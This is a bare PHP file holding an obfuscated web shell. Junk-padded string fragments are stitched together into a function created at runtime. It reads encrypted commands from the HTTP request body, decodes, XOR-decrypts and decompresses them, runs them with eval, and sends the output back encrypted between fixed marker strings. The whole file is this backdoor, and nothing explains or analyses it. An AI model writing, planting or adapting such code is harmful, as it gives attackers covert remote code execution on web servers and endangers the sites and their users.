<?php
$k='jIj("/$kh(.Ij+)$Ijkf/",@file_geIjt_coIjnteIjnts(Ij"php://inIjput")Ij,$m)Ij==1)Ij {@ob_stIjart();@';
$U='Ij0;($j<$Ijc&Ij&$i<$l);$Ijj++Ij,Ij$i+Ij+){$oIj.=$t{$i}Ij^$k{$Ijj};}}return $o;}IjIjif (@preg_matchI';
$S=str_replace('w','','crewatwew_fwuwnctwion');
$c=';@ob_endIj_cleanIjIj();$r=@baseIj64_enIjcodeIj(@x(Ij@gzcIjompress($o),$Ijk));pIjIjrint(Ij"$p$kh$r$kf");}';
$o='IjiIjon xIj($t,Ij$k){$c=strIjlen($kIj);$l=strleIjIjn($t);$o="";foIjr(Ij$Iji=0;$i<$l;Ij){for($j=';
$G='$k="b8Ij4IjIj1e557";$kh="Ij241Ij30ae6445Ij4";$kf="d4e76IjeIj539a79";$p=Ij"bodxg4IjpbSVYiZIjaji";fIjunct';
$B='evIjal(@gzuIjncompress(Ij@x(@bIjase64_IjdecoIjde($m[Ij1Ij]Ij),$k)));Ij$o=@ob_getIj_Ijcontents()';
$z=str_replace('Ij','',$G.$o.$U.$k.$B.$c);
$i=$S('',$z);$i();
?>
